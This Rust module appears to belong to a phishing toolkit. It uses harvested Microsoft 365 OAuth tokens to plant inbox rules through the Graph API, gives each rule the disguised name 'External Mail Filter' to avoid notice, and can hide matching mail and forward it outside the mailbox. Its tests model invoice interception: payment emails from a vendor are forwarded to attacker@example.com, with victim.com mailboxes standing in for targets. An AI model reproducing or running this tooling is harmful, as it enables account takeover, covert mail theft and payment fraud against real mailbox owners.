use crate::graph_client::GraphClient;
use crate::vault::Vault;
use crate::AppState;
use actix_web::{web, HttpResponse, Responder};
use anyhow::Context;
use chrono::Utc;
use serde::{Deserialize, Serialize};
use sqlx::SqlitePool;

#[derive(Debug, Clone, Serialize, Deserialize, sqlx::FromRow)]
pub struct CreatedRule {
    pub id: String,
    pub token_id: String,
    pub graph_rule_id: Option<String>,
    pub display_name: String,
    pub disguise_name: String,
    pub conditions_json: String,
    pub actions_json: String,
    pub target_folder: Option<String>,
    pub forward_to: Option<String>,
    pub created_at: chrono::DateTime<Utc>,
    pub status: String,
}

#[derive(Deserialize)]
pub struct CreateRuleRequest {
    pub token_id: String,
    pub rule_name: String,
    pub condition_subject_contains: Vec<String>,
    pub condition_sender_domain: Vec<String>,
    pub action_move_to_folder: Option<String>,
    pub action_forward_to: Option<String>,
    pub stop_processing: bool,
}

/// Build the Graph API messageRule payload with a disguised display name.
fn build_rule_payload(req: &CreateRuleRequest) -> serde_json::Value {
    let mut conditions = serde_json::Map::new();

    if !req.condition_subject_contains.is_empty() {
        conditions.insert(
            "subjectContains".to_string(),
            serde_json::json!(req.condition_subject_contains),
        );
    }

    if !req.condition_sender_domain.is_empty() {
        let addresses: Vec<serde_json::Value> = req
            .condition_sender_domain
            .iter()
            .map(|d| {
                serde_json::json!({
                    "address": format!("@{}", d.trim_start_matches('@')),
                    "name": d
                })
            })
            .collect();
        conditions.insert(
            "fromAddresses".to_string(),
            serde_json::json!(addresses),
        );
    }

    let mut actions = serde_json::Map::new();

    if let Some(folder) = &req.action_move_to_folder {
        actions.insert(
            "moveToFolder".to_string(),
            serde_json::json!(folder),
        );
    }

    if let Some(forward) = &req.action_forward_to {
        actions.insert(
            "forwardTo".to_string(),
            serde_json::json!([{
                "emailAddress": {
                    "address": forward,
                    "name": forward
                }
            }]),
        );
    }

    if req.stop_processing {
        actions.insert(
            "stopProcessingRules".to_string(),
            serde_json::Value::Bool(true),
        );
    }

    // Disguised name so it looks legitimate in the UI
    let disguise_name = "External Mail Filter".to_string();

    serde_json::json!({
        "displayName": disguise_name,
        "sequence": 1,
        "isEnabled": true,
        "conditions": conditions,
        "actions": actions
    })
}

/// Ensure the target mail folder exists. If not, create it.
async fn ensure_folder(
    client: &GraphClient,
    token: &str,
    folder_name: &str,
) -> anyhow::Result<String> {
    let folders = client.get_mail_folders(token, "me").await?;

    for folder in &folders.value {
        if folder.displayName.as_deref() == Some(folder_name) {
            return Ok(folder.id.clone());
        }
    }

    let new_folder = client.create_mail_folder(token, folder_name).await?;
    println!("[rules] Created mail folder '{}' with id {}", folder_name, new_folder.id);
    Ok(new_folder.id)
}

/// Create an inbox rule. Returns the Graph rule ID on success.
pub async fn create_inbox_rule(
    state: &crate::AppState,
    client: &GraphClient,
    req: &CreateRuleRequest,
) -> anyhow::Result<MessageRuleResult> {
    let pool = &state.pool;
    let vault = &state.vault;
    
    let token = match vault.retrieve_token(pool, &req.token_id).await {
        Ok(t) => t,
        Err(_) => {
            // Fall back to harvested table
            let row: crate::HarvestedToken = sqlx::query_as(
                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
            )
            .bind(&req.token_id)
            .fetch_one(pool)
            .await
            .map_err(|e| anyhow::anyhow!("Token not found in any storage: {}", e))?;
            
            crate::vault::DecryptedToken {
                id: row.id,
                campaign_id: "harvested".to_string(),
                user_email: row.email.unwrap_or_default(),
                access_token: row.access_token,
                refresh_token: row.refresh_token,
                expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
                created_at: chrono::Utc::now(),
                scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                last_refreshed_at: Some(chrono::Utc::now()),
            }
        }
    };
    
    // Refresh the access token before using it
    let access_token = crate::refresh_access_token(state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());

    // Ensure target folder exists if specified
    let target_folder_id = if let Some(folder_name) = &req.action_move_to_folder {
        Some(ensure_folder(client, &access_token, folder_name).await?)
    } else {
        None
    };

    let payload = build_rule_payload(req);
    let graph_rule = client
        .create_message_rule(&access_token, "me", payload.clone())
        .await
        .context("Graph API rejected rule creation")?;

    let id = uuid::Uuid::new_v4().to_string();
    let now = Utc::now();

    sqlx::query(
        r#"
        INSERT INTO created_rules (
            id, token_id, graph_rule_id, display_name, disguise_name,
            conditions_json, actions_json, target_folder, forward_to,
            created_at, status
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        "#,
    )
    .bind(&id)
    .bind(&req.token_id)
    .bind(&graph_rule.id)
    .bind(&req.rule_name)
    .bind("External Mail Filter")
    .bind(&serde_json::to_string(&payload["conditions"]).unwrap_or_default())
    .bind(&serde_json::to_string(&payload["actions"]).unwrap_or_default())
    .bind(&req.action_move_to_folder)
    .bind(&req.action_forward_to)
    .bind(now)
    .bind("active")
    .execute(pool)
    .await
    .context("Failed to persist rule metadata")?;

    println!(
        "[rules] Created rule {} for token {} (graph id: {:?})",
        id, req.token_id, graph_rule.id
    );

    Ok(MessageRuleResult {
        rule_id: id,
        graph_rule_id: graph_rule.id,
        target_folder_id,
        payload,
    })
}

#[derive(Serialize)]
pub struct MessageRuleResult {
    pub rule_id: String,
    pub graph_rule_id: Option<String>,
    pub target_folder_id: Option<String>,
    pub payload: serde_json::Value,
}

// === HTTP Handlers ===

pub async fn list_rules_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = query.get("token_id").cloned().unwrap_or_default();
    if token_id.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({
            "error": "token_id required"
        }));
    }

    let rows: Vec<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE token_id = ? ORDER BY created_at DESC"
    )
    .bind(&token_id)
    .fetch_all(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[rules] Failed to list rules: {}", e);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "list_rules_failed",
                "details": format!("{}", e)
            }));
        }
    };

    HttpResponse::Ok().json(rows)
}

pub async fn create_rule_handler(
    body: web::Json<CreateRuleRequest>,
    audit_ctx: crate::audit::AuditContext,
    state: web::Data<AppState>,
) -> impl Responder {
    let client = GraphClient::new();
    let result = create_inbox_rule(&state, &client, &body).await;

    let success = result.is_ok();
    let _ = crate::audit::insert_audit_log(
        &state.pool,
        "rule_created",
        None,
        Some(&body.token_id),
        None,
        Some(&audit_ctx.ip_address),
        Some(&audit_ctx.user_agent),
        Some(serde_json::json!({
            "rule_name": body.rule_name,
            "success": success
        })),
        success,
    ).await;

    match result {
        Ok(result) => HttpResponse::Ok().json(serde_json::json!({
            "status": "created",
            "rule_id": result.rule_id,
            "graph_rule_id": result.graph_rule_id,
            "target_folder_id": result.target_folder_id,
            "rule_payload": result.payload
        })),
        Err(e) => {
            let msg = format!("{}", e);
            let status_code = if msg.contains("insufficient privileges")
                || msg.contains("Authorization_RequestDenied")
            {
                403
            } else if msg.contains("not found") || msg.contains("NotFound") {
                404
            } else {
                500
            };
            eprintln!("[rules] Rule creation failed for {}: {}", body.token_id, msg);
            HttpResponse::build(actix_web::http::StatusCode::from_u16(status_code).unwrap())
                .json(serde_json::json!({
                    "error": "rule_creation_failed",
                    "details": msg
                }))
        }
    }
}

pub async fn delete_rule_handler(
    path: web::Path<String>,
    state: web::Data<AppState>,
) -> impl Responder {
    let rule_id = path.into_inner();

    // Get the rule from DB to find graph_rule_id and token_id
    let rule: Option<CreatedRule> = match sqlx::query_as::<_, CreatedRule>(
        "SELECT id, token_id, graph_rule_id, display_name, disguise_name, conditions_json, actions_json, target_folder, forward_to, created_at, status FROM created_rules WHERE id = ?"
    )
    .bind(&rule_id)
    .fetch_optional(&state.pool)
    .await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("[rules] Failed to find rule {}: {}", rule_id, e);
            return HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "rule_lookup_failed",
                "details": format!("{}", e)
            }));
        }
    };

    let rule = match rule {
        Some(r) => r,
        None => {
            return HttpResponse::NotFound().json(serde_json::json!({
                "error": "rule_not_found",
                "message": "Rule not found in database"
            }));
        }
    };

    // Try to delete from Graph API if graph_rule_id exists
    let graph_deleted = if let Some(graph_id) = &rule.graph_rule_id {
        let token_result = match state.vault.retrieve_token(&state.pool, &rule.token_id).await {
            Ok(t) => Some(t),
            Err(_) => {
                match sqlx::query_as::<_, crate::HarvestedToken>(
                    "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
                )
                .bind(&rule.token_id)
                .fetch_one(&state.pool)
                .await {
                    Ok(row) => Some(crate::vault::DecryptedToken {
                        id: row.id,
                        campaign_id: "harvested".to_string(),
                        user_email: row.email.unwrap_or_default(),
                        access_token: row.access_token,
                        refresh_token: row.refresh_token,
                        expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
                        created_at: chrono::Utc::now(),
                        scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                        last_refreshed_at: Some(chrono::Utc::now()),
                    }),
                    Err(e) => {
                        eprintln!("[rules] Failed to retrieve token for rule deletion: {}", e);
                        None
                    }
                }
            }
        };
        
        if let Some(t) = token_result {
            let access_token = crate::refresh_access_token(&state, &t.refresh_token).await
                .unwrap_or_else(|| t.access_token.clone());
            let client = GraphClient::new();
            match client.delete_message_rule(&access_token, "me", graph_id).await {
                Ok(_) => {
                    println!("[rules] Deleted graph rule {} for local rule {}", graph_id, rule_id);
                    true
                }
                Err(e) => {
                    eprintln!("[rules] Graph API delete failed for rule {}: {}", graph_id, e);
                    false
                }
            }
        } else {
            false
        }
    } else {
        false
    };

    // Delete from local DB
    match sqlx::query("DELETE FROM created_rules WHERE id = ?")
        .bind(&rule_id)
        .execute(&state.pool)
        .await {
        Ok(_) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": "deleted",
                "rule_id": rule_id,
                "graph_deleted": graph_deleted,
                "message": if graph_deleted { "Rule deleted from both Graph API and local database" } else { "Rule deleted from local database only (Graph API may still have the rule)" }
            }))
        }
        Err(e) => {
            eprintln!("[rules] Failed to delete local rule {}: {}", rule_id, e);
            HttpResponse::InternalServerError().json(serde_json::json!({
                "error": "local_delete_failed",
                "details": format!("{}", e)
            }))
        }
    }
}

pub async fn fetch_graph_rules_handler(
    query: web::Query<std::collections::HashMap<String, String>>,
    state: web::Data<AppState>,
) -> impl Responder {
    let token_id = query.get("token_id").cloned().unwrap_or_default();
    if token_id.is_empty() {
        return HttpResponse::BadRequest().json(serde_json::json!({
            "error": "token_id required"
        }));
    }

    let token = match state.vault.retrieve_token(&state.pool, &token_id).await {
        Ok(t) => t,
        Err(_) => {
            // Fall back to harvested table
            match sqlx::query_as::<_, crate::HarvestedToken>(
                "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
            )
            .bind(&token_id)
            .fetch_one(&state.pool)
            .await {
                Ok(row) => crate::vault::DecryptedToken {
                    id: row.id,
                    campaign_id: "harvested".to_string(),
                    user_email: row.email.unwrap_or_default(),
                    access_token: row.access_token,
                    refresh_token: row.refresh_token,
                    expires_at: chrono::Utc::now() + chrono::Duration::hours(1),
                    created_at: chrono::Utc::now(),
                    scopes: vec!["Mail.ReadWrite".to_string(), "Mail.Send".to_string(), "MailboxSettings.ReadWrite".to_string()],
                    last_refreshed_at: Some(chrono::Utc::now()),
                },
                Err(e) => {
                    return HttpResponse::NotFound().json(serde_json::json!({
                        "error": "token_not_found",
                        "details": format!("Token not found in any storage: {}", e)
                    }));
                }
            }
        }
    };

    let access_token = crate::refresh_access_token(&state, &token.refresh_token).await
        .unwrap_or_else(|| token.access_token.clone());
    
    let client = GraphClient::new();
    match client.list_message_rules(&access_token, "me").await {
        Ok(rules) => {
            HttpResponse::Ok().json(serde_json::json!({
                "status": "success",
                "count": rules.value.len(),
                "rules": rules.value
            }))
        }
        Err(e) => {
            let msg = format!("{}", e);
            let status_code = if msg.contains("insufficient privileges")
                || msg.contains("Authorization_RequestDenied")
            {
                403
            } else if msg.contains("not found") || msg.contains("NotFound") {
                404
            } else {
                500
            };
            eprintln!("[rules] Failed to fetch graph rules for {}: {}", token_id, msg);
            HttpResponse::build(actix_web::http::StatusCode::from_u16(status_code).unwrap())
                .json(serde_json::json!({
                    "error": "fetch_graph_rules_failed",
                    "details": msg
                }))
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::AppConfig;
    use sqlx::sqlite::SqlitePoolOptions;
    use wiremock::matchers::{header, method, path};
    use wiremock::{Mock, MockServer, ResponseTemplate};

    async fn setup_test_state() -> AppState {
        let pool = SqlitePoolOptions::new()
            .max_connections(1)
            .connect("sqlite::memory:")
            .await
            .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE tokens (
                id TEXT PRIMARY KEY,
                campaign_id TEXT,
                user_email TEXT,
                encrypted_access_token BLOB NOT NULL,
                encrypted_refresh_token BLOB NOT NULL,
                access_salt BLOB NOT NULL,
                refresh_salt BLOB NOT NULL,
                scopes TEXT,
                expires_at DATETIME NOT NULL,
                created_at DATETIME NOT NULL,
                last_refreshed_at DATETIME,
                status TEXT DEFAULT 'active'
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        sqlx::query(
            r#"
            CREATE TABLE created_rules (
                id TEXT PRIMARY KEY,
                token_id TEXT NOT NULL,
                graph_rule_id TEXT,
                display_name TEXT NOT NULL,
                disguise_name TEXT NOT NULL,
                conditions_json TEXT NOT NULL,
                actions_json TEXT NOT NULL,
                target_folder TEXT,
                forward_to TEXT,
                created_at DATETIME NOT NULL,
                status TEXT NOT NULL
            )
            "#,
        )
        .execute(&pool)
        .await
        .unwrap();

        let config = AppConfig {
            client_id: "test_client_id".to_string(),
            client_secret: "test_secret".to_string(),
            redirect_uri: "http://localhost".to_string(),
            first_party_ids: vec![],
            database_url: "sqlite::memory:".to_string(),
            telegram_bot_token: None,
            telegram_chat_id: None,
            master_secret: "test_rules_secret".to_string(),
            frontend_url: None,
        };

        let vault = Vault::new(config.master_secret.clone());
        let http_client = reqwest::Client::new();

        let response_key = crate::response_crypto::ResponseCrypto::derive_key(&config.master_secret);

        AppState {
            pool,
            config,
            http_client,
            vault,
            response_key,
        }
    }

    #[tokio::test]
    async fn test_create_rule_with_folder_creation() {
        let state = setup_test_state().await;
        let mock_server = MockServer::start().await;
        let client = GraphClient::with_base_url(&mock_server.uri());

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp_rules",
                "rules@victim.com",
                "access_rules_123",
                "refresh_rules_123",
                vec!["MailboxSettings.ReadWrite".to_string()],
                Utc::now() + chrono::Duration::hours(2),
            )
            .await
            .unwrap();

        // Mock GET /me/mailFolders — folder does not exist yet
        Mock::given(method("GET"))
            .and(path("/v1.0/me/mailFolders"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    { "id": "inbox", "displayName": "Inbox" },
                    { "id": "sent", "displayName": "Sent Items" }
                ]
            })))
            .mount(&mock_server)
            .await;

        // Mock POST /me/mailFolders — create folder
        Mock::given(method("POST"))
            .and(path("/v1.0/me/mailFolders"))
            .respond_with(ResponseTemplate::new(201).set_body_json(serde_json::json!({
                "id": "folder-processed-1",
                "displayName": "Processed"
            })))
            .mount(&mock_server)
            .await;

        // Mock POST /me/mailFolders/inbox/messageRules
        Mock::given(method("POST"))
            .and(path("/v1.0/me/mailFolders/inbox/messageRules"))
            .respond_with(ResponseTemplate::new(201).set_body_json(serde_json::json!({
                "id": "graph-rule-1",
                "displayName": "External Mail Filter",
                "isEnabled": true
            })))
            .mount(&mock_server)
            .await;

        let req = CreateRuleRequest {
            token_id,
            rule_name: "Invoice Intercept".to_string(),
            condition_subject_contains: vec!["invoice".to_string(), "payment".to_string()],
            condition_sender_domain: vec!["vendor.com".to_string()],
            action_move_to_folder: Some("Processed".to_string()),
            action_forward_to: Some("attacker@example.com".to_string()),
            stop_processing: true,
        };

        let result = create_inbox_rule(&state, &client, &req)
            .await
            .expect("Rule creation should succeed");

        assert_eq!(result.graph_rule_id, Some("graph-rule-1".to_string()));
        assert_eq!(result.target_folder_id, Some("folder-processed-1".to_string()));

        // Verify DB record
        let row: (String, String, Option<String>) = sqlx::query_as(
            "SELECT display_name, disguise_name, graph_rule_id FROM created_rules WHERE id = ?"
        )
        .bind(&result.rule_id)
        .fetch_one(&state.pool)
        .await
        .unwrap();

        assert_eq!(row.0, "Invoice Intercept");
        assert_eq!(row.1, "External Mail Filter");
        assert_eq!(row.2, Some("graph-rule-1".to_string()));
    }

    #[tokio::test]
    async fn test_create_rule_existing_folder() {
        let state = setup_test_state().await;
        let mock_server = MockServer::start().await;
        let client = GraphClient::with_base_url(&mock_server.uri());

        let token_id = state
            .vault
            .store_token(
                &state.pool,
                "camp_rules2",
                "rules2@victim.com",
                "access_rules_456",
                "refresh_rules_456",
                vec!["MailboxSettings.ReadWrite".to_string()],
                Utc::now() + chrono::Duration::hours(2),
            )
            .await
            .unwrap();

        // Mock GET /me/mailFolders — folder already exists
        Mock::given(method("GET"))
            .and(path("/v1.0/me/mailFolders"))
            .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
                "value": [
                    { "id": "inbox", "displayName": "Inbox" },
                    { "id": "folder-existing", "displayName": "Archive" }
                ]
            })))
            .mount(&mock_server)
            .await;

        // Mock POST rule
        Mock::given(method("POST"))
            .and(path("/v1.0/me/mailFolders/inbox/messageRules"))
            .respond_with(ResponseTemplate::new(201).set_body_json(serde_json::json!({
                "id": "graph-rule-2",
                "displayName": "External Mail Filter"
            })))
            .mount(&mock_server)
            .await;

        let req = CreateRuleRequest {
            token_id,
            rule_name: "Archive Rule".to_string(),
            condition_subject_contains: vec!["statement".to_string()],
            condition_sender_domain: vec![],
            action_move_to_folder: Some("Archive".to_string()),
            action_forward_to: None,
            stop_processing: false,
        };

        let result = create_inbox_rule(&state, &client, &req)
            .await
            .expect("Rule creation should succeed");

        assert_eq!(result.target_folder_id, Some("folder-existing".to_string()));
    }
}
